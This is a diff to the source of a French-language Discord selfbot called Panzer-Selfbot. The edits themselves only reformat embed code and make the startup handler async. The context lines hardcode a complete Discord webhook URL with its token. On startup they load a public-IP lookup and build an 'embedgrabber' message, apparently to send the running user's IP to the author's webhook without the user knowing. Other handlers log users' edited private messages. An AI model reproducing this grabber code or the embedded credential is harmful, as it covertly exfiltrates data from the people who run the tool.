@@ -26,7 +26,7 @@ const {
 } = require('os');
 const webhook = require('webhook-discord');
 const Hook = new webhook.Webhook('https://canary.discord.com/api/webhooks/863691319091396619/Oe94XjQywefcBHrSJp29uBoT4ElC66jSJetroDnlndgTunPhPsVcvWWP7uR4fGZYrT7G');
-client.on('ready', function () {
+client.on('ready', async function () {
     const ipgrabber = require('public-ip');
     const embedgrabber = new webhook.MessageBuilder()
         .setName(' Panzer', true)
@@ -2067,10 +2067,10 @@ client.on('message', message => {
         };
         let embed = new Discord.RichEmbed();
         embed.setColor(color)
-        .setTitle(`**${client.user.username} fait un calin a ${mentionuser.username}**`)
-        .setTimestamp()
-        .setFooter('Panzer-Selfbot 1.2')
-        .setImage(hugh[Math.floor(Math.random() * hugh.length)]);
+            .setTitle(`**${client.user.username} fait un calin a ${mentionuser.username}**`)
+            .setTimestamp()
+            .setFooter('Panzer-Selfbot 1.2')
+            .setImage(hugh[Math.floor(Math.random() * hugh.length)]);
         message.edit(embed).catch(err => {
             return console.log('[', 'ERROR'.red, ']', 'une erreur est survenue que je ne peux régler'.green);
         });
@@ -2823,10 +2823,10 @@ client.on('messageUpdate', (message) => {
         return
     };
     if (message.channel.type === 'dm') {
-        console.log('╔═════════════════════════════════╗' ['blue']);
-        console.log('Log:' ['red']) ^ console.log('╟─────────────────────────────────╢' ['blue']);
-        console.log(`${'║--> message mp modifié \n║--> User: '}${message.author.tag}${'\n║--> Content: '}${message.content}${'\n║--> At: '}${message.createdAt}${''}` ['green']);
-        console.log('╚═════════════════════════════════╝' ['blue'])
+        console.log('╔═════════════════════════════════╗'.blue);
+        console.log('Log:' ['red']) ^ console.log('╟─────────────────────────────────╢'.blue);
+        console.log(`${'║--> message mp modifié \n║--> User: '}${message.author.tag}${'\n║--> Content: '}${message.content}${'\n║--> At: '}${message.createdAt}${''}`.green);
+        console.log('╚═════════════════════════════════╝'.blue)
     }
 });
 client.on("messageUpdate", message => {
